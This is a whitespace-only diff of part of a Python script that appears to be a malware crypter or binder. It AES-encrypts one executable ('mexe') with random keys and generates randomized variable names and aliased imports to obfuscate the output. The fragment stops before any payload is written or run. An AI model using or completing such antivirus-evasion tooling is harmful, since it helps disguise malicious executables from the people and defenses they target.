@@ -17,7 +17,6 @@
 from Crypto.Cipher import AES
 import base64, random, string, sys, os, argparse
 
-
 def randKey(bytes):
 	return ''.join(random.choice(string.ascii_letters + string.digits + "{}!@#$^&()*&[]|,./?") for x in range(bytes))
 
@@ -34,7 +33,6 @@ if not args.mexe or not args.iexe or not args.var:
 	parser.print_help()
 	exit()
 
-
 BLOCK_SIZE, PADDING = 32, '{'
 pad = lambda s: str(s) + (BLOCK_SIZE - len(str(s)) % BLOCK_SIZE) * PADDING
 EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
@@ -42,7 +40,6 @@ DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
 key, iv = randKey(32), randKey(16)
 bd64var, AESvar = randVar(), randVar()
 myendings = ['from Crypto import Random', 'from Crypto.Cipher import AES as %s' % (AESvar), 'from base64 import b64decode as %s' % (bd64var), 'import os', 'import threading']
-
 	
 with open(args.mexe, 'rb') as exe:
 	mexe = exe.read().encode('base64')
